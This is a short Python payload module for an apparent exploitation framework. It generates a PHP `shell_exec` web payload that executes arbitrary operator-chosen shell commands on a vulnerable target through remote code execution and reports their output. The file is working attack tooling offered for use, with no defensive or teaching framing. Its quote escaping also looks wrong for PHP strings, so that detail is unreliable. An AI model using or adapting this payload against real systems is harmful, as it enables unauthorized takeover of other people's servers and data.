"""
HWP Payload — Bash Command

Execute arbitrary shell commands on the target.

The payload emits PHP (RCE). If the vulnerable sink is an OS shell rather than a
PHP interpreter, the exploit wraps the PHP as `php -r` itself (see Exploit.php_shell).

Options:
    --cmd       Command(s) to execute (required)
"""

from hwp import Payload


class BashCmd(Payload):
    name = "Bash Command"
    methods = ["RCE"]
    description = "Execute shell commands on the target"
    options = [
        {"name": "cmd", "default": "", "help": "Shell command to run", "required": True},
    ]

    def instructions(self):
        cmd = self.options.get("cmd", "")
        if not cmd:
            self.error("CMD is required")
            return []

        self.info(f"Executing: {cmd}")

        # Escape single quotes for PHP shell_exec
        safe = cmd.replace("'", "'\\''")
        return [f"<?php echo shell_exec('{safe}'); ?>"]

    def report(self, results):
        for r in results:
            if r.success and r.output:
                self.success("Output:")
                print(r.output)
